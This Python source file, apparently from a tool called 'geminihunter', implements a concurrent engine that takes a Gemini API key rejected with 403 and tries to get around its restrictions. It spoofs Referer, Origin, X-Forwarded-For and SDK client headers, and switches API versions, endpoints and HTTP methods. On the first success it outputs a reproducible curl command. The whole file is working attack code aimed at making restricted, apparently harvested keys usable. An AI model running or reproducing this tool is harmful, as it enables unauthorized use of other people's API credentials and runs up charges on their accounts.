"""403 Bypass engine with auto-registered strategy pattern."""

import asyncio
import json
import logging
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import ClassVar

import httpx

from geminihunter.models import BypassDetail

logger = logging.getLogger("geminihunter")

GEMINI_BASE_URL = "https://generativelanguage.googleapis.com"

# --- Bypass data structures ---


@dataclass
class BypassAttempt:
    """A single bypass attempt configuration."""

    technique_name: str
    headers: dict[str, str] = field(default_factory=dict)
    api_version: str = "v1beta"
    endpoint: str = "models"
    method: str = "GET"
    body: str | None = None
    key_in_header: bool = False

    def to_url(self, key: str) -> str:
        base = f"{GEMINI_BASE_URL}/{self.api_version}/{self.endpoint}"
        if self.key_in_header:
            return base
        return f"{base}?key={key}"

    def to_curl(self, key: str) -> str:
        """Generate a curl command that reproduces this attempt."""
        url = self.to_url(key)
        parts = [f"curl -s -X {self.method}"]
        for k, v in self.headers.items():
            parts.append(f'-H "{k}: {v}"')
        if self.body:
            parts.append(f"-d '{self.body}'")
        parts.append(f'"{url}"')
        return " ".join(parts)

    def to_bypass_detail(self) -> BypassDetail:
        return BypassDetail(
            technique=self.technique_name,
            headers=dict(self.headers),
            api_version=self.api_version,
            endpoint=self.endpoint,
            method=self.method,
            body=self.body,
            curl_command="",  # Filled later with key
            key_in_header=self.key_in_header,
        )


# --- Strategy registry ---

_bypass_registry: list[type["BypassStrategy"]] = []


def bypass_strategy(cls: type["BypassStrategy"]) -> type["BypassStrategy"]:
    """Decorator to auto-register a bypass strategy."""
    _bypass_registry.append(cls)
    return cls


class BypassStrategy(ABC):
    """Base class for bypass techniques."""

    name: ClassVar[str]

    @abstractmethod
    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        ...


# --- Registered strategies ---


@bypass_strategy
class RefererGoogle(BypassStrategy):
    """Bypass with Google referrer headers."""

    name = "referer_google"

    REFERERS = [
        "https://www.google.com",
        "https://www.google.com/",
        "https://console.cloud.google.com",
        "https://aistudio.google.com",
        "https://makersuite.google.com",
        "https://ai.google.dev",
        "https://cloud.google.com",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class RefererTarget(BypassStrategy):
    """Bypass with target domain as referrer."""

    name = "referer_target"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        if not target_domain or target_domain == "direct":
            return []
        variants = [
            f"https://{target_domain}",
            f"https://{target_domain}/",
            f"https://www.{target_domain}",
            f"http://{target_domain}",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in variants
        ]


@bypass_strategy
class RefererCommon(BypassStrategy):
    """Bypass with common referrer values."""

    name = "referer_common"

    REFERERS = [
        "https://googleapis.com",
        "http://localhost",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://127.0.0.1",
        "https://example.com",
        "",  # Empty referer
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref or 'empty'}",
                headers={"Referer": ref} if ref else {},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class OriginHeader(BypassStrategy):
    """Bypass using Origin header manipulation."""

    name = "origin_header"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        origins = [
            "https://www.google.com",
            "https://console.cloud.google.com",
            "https://aistudio.google.com",
            "null",  # Some servers allow null origin
        ]
        if target_domain and target_domain != "direct":
            origins.append(f"https://{target_domain}")

        return [
            BypassAttempt(
                technique_name=f"{self.name}:{origin}",
                headers={"Origin": origin},
            )
            for origin in origins
        ]


@bypass_strategy
class ForwardedForBypass(BypassStrategy):
    """Bypass using X-Forwarded-For / X-Real-IP with internal IPs."""

    name = "xff_bypass"

    INTERNAL_IPS = [
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "0.0.0.0",
        "::1",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ip}",
                headers={
                    "X-Forwarded-For": ip,
                    "X-Real-IP": ip,
                },
            )
            for ip in self.INTERNAL_IPS
        ]


@bypass_strategy
class APIVersionBrute(BypassStrategy):
    """Bypass by trying different API versions."""

    name = "api_version"

    VERSIONS = ["v1", "v1beta", "v1beta2", "v1beta3"]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                api_version=ver,
            )
            for ver in self.VERSIONS
        ]


@bypass_strategy
class EndpointSwitch(BypassStrategy):
    """Bypass by trying different API endpoints."""

    name = "endpoint_switch"

    ENDPOINTS = [
        ("models", "GET", None),
        (
            "models/gemini-2.0-flash:generateContent",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "hi"}]}]}),
        ),
        (
            "models/embedding-001:embedContent",
            "POST",
            json.dumps(
                {
                    "model": "models/embedding-001",
                    "content": {"parts": [{"text": "test"}]},
                }
            ),
        ),
        (
            "models/gemini-2.0-flash:countTokens",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "test"}]}]}),
        ),
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        for endpoint, method, body in self.ENDPOINTS:
            headers = {}
            if body:
                headers["Content-Type"] = "application/json"
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{endpoint}",
                    endpoint=endpoint,
                    method=method,
                    body=body,
                    headers=headers,
                )
            )
        return attempts


@bypass_strategy
class MethodSwitch(BypassStrategy):
    """Bypass by switching HTTP method."""

    name = "method_switch"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(technique_name=f"{self.name}:POST", method="POST"),
            BypassAttempt(technique_name=f"{self.name}:OPTIONS", method="OPTIONS"),
            BypassAttempt(technique_name=f"{self.name}:HEAD", method="HEAD"),
        ]


@bypass_strategy
class ComboRefererVersion(BypassStrategy):
    """Combo: Google referer + different API versions."""

    name = "combo_referer_version"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
        ]
        versions = ["v1", "v1beta", "v1beta2", "v1beta3"]

        for ref in referers:
            for ver in versions:
                attempts.append(
                    BypassAttempt(
                        technique_name=f"{self.name}:{ref}+{ver}",
                        headers={"Referer": ref},
                        api_version=ver,
                    )
                )
        return attempts


@bypass_strategy
class ComboRefererEndpoint(BypassStrategy):
    """Combo: Google referer + generateContent endpoint."""

    name = "combo_referer_endpoint"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
            "https://console.cloud.google.com",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}+generateContent",
                headers={
                    "Referer": ref,
                    "Content-Type": "application/json",
                },
                endpoint="models/gemini-2.0-flash:generateContent",
                method="POST",
                body=body,
            )
            for ref in referers
        ]


@bypass_strategy
class ApiKeyHeader(BypassStrategy):
    """Bypass by sending key via x-goog-api-key header instead of query param."""

    name = "api_key_header"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                headers={"x-goog-api-key": key},
                api_version=ver,
                key_in_header=True,
            )
            for ver in ("v1beta", "v1", "v1beta2", "v1beta3")
        ]


@bypass_strategy
class StreamEndpoint(BypassStrategy):
    """Bypass by targeting the streaming endpoint."""

    name = "stream_endpoint"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                endpoint=f"models/gemini-2.0-flash:streamGenerateContent",
                method="POST",
                body=body,
                headers={"Content-Type": "application/json"},
                api_version=ver,
            )
            for ver in ("v1beta", "v1")
        ]


@bypass_strategy
class AlternateEndpoints(BypassStrategy):
    """Bypass by trying less common API endpoints."""

    name = "alt_endpoint"

    ENDPOINTS = [
        "tunedModels",
        "cachedContents",
        "files",
        "corpora",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ep}",
                endpoint=ep,
            )
            for ep in self.ENDPOINTS
        ]


@bypass_strategy
class ComboApiKeyHeaderReferer(BypassStrategy):
    """Combo: x-goog-api-key header + Referer + Origin (triple bypass)."""

    name = "combo_header_referer"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        referers = [
            "https://aistudio.google.com",
            "https://console.cloud.google.com",
            "https://ai.google.dev",
        ]
        attempts = []
        for ref in referers:
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{ref}",
                    headers={
                        "x-goog-api-key": key,
                        "Referer": ref,
                        "Origin": ref,
                    },
                    key_in_header=True,
                )
            )
            # Also try with generateContent
            body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{ref}+generateContent",
                    headers={
                        "x-goog-api-key": key,
                        "Referer": ref,
                        "Origin": ref,
                        "Content-Type": "application/json",
                    },
                    endpoint="models/gemini-2.0-flash:generateContent",
                    method="POST",
                    body=body,
                    key_in_header=True,
                )
            )
        return attempts


@bypass_strategy
class SdkHeaders(BypassStrategy):
    """Bypass by mimicking official Google SDK client headers."""

    name = "sdk_headers"

    SDK_CLIENTS = [
        "genai-js/0.21.0",
        "gl-python/3.12.0 grpc/1.62.0 gax/2.24.0",
        "genai-go/0.7.0",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{client.split('/')[0]}",
                headers={"X-Goog-Api-Client": client},
            )
            for client in self.SDK_CLIENTS
        ]


@bypass_strategy
class SdkUserAgent(BypassStrategy):
    """Bypass by using official Google SDK User-Agent strings."""

    name = "sdk_ua"

    SDK_AGENTS = [
        "google-api-python-client/2.149.0 (gzip)",
        "gl-python/3.12 google-cloud-sdk/0.1",
        "google-api-nodejs-client/9.14.0",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ua.split('/')[0]}",
                headers={"User-Agent": ua},
            )
            for ua in self.SDK_AGENTS
        ]


# --- Bypass engine ---


BYPASS_TIMEOUT = 5.0  # Shorter timeout for bypass attempts


class BypassEngine:
    """Runs all registered strategies against a 403'd key."""

    def __init__(self, strategies: list[BypassStrategy] | None = None):
        if strategies is None:
            self.strategies = [cls() for cls in _bypass_registry]
        else:
            self.strategies = strategies

    def generate_all_attempts(
        self, key: str, target_domain: str
    ) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        for strategy in self.strategies:
            attempts.extend(strategy.generate_attempts(key, target_domain))
        return attempts

    async def run(
        self,
        key: str,
        target_domain: str,
        client: httpx.AsyncClient,
        concurrency: int = 10,
    ) -> BypassDetail | None:
        """
        Execute all bypass attempts concurrently.
        Returns immediately on first success, cancelling remaining tasks.
        """
        attempts = self.generate_all_attempts(key, target_domain)
        sem = asyncio.Semaphore(concurrency)
        found: asyncio.Event = asyncio.Event()
        winner: list[tuple[BypassAttempt, int]] = []  # (attempt, status_code)

        async def try_attempt(attempt: BypassAttempt) -> None:
            if found.is_set():
                return
            async with sem:
                if found.is_set():
                    return
                try:
                    url = attempt.to_url(key)
                    kwargs: dict = {"headers": dict(attempt.headers)}
                    if attempt.body:
                        kwargs["content"] = attempt.body

                    resp = await client.request(
                        attempt.method, url, timeout=BYPASS_TIMEOUT, **kwargs
                    )

                    # 200 = direct success, 429 = key accepted but rate-limited
                    # Both confirm the bypass works (original was 403)
                    if resp.status_code in (200, 429):
                        winner.append((attempt, resp.status_code))
                        found.set()

                except (httpx.HTTPError, Exception):
                    pass

        tasks = [asyncio.create_task(try_attempt(a)) for a in attempts]
        # found_waiter resolves on first bypass success;
        # all_done resolves when every attempt finishes (no bypass found).
        # We exit on whichever comes first (or timeout).
        found_waiter = asyncio.create_task(found.wait())
        all_done = asyncio.ensure_future(
            asyncio.gather(*tasks, return_exceptions=True)
        )
        try:
            await asyncio.wait(
                {found_waiter, all_done},
                timeout=BYPASS_TIMEOUT + 2,
                return_when=asyncio.FIRST_COMPLETED,
            )
        finally:
            found_waiter.cancel()
            for t in tasks:
                if not t.done():
                    t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        if winner:
            attempt, status_code = winner[0]
            detail = attempt.to_bypass_detail()
            detail.curl_command = attempt.to_curl(key)
            detail.bypass_status_code = status_code
            return detail

        return None
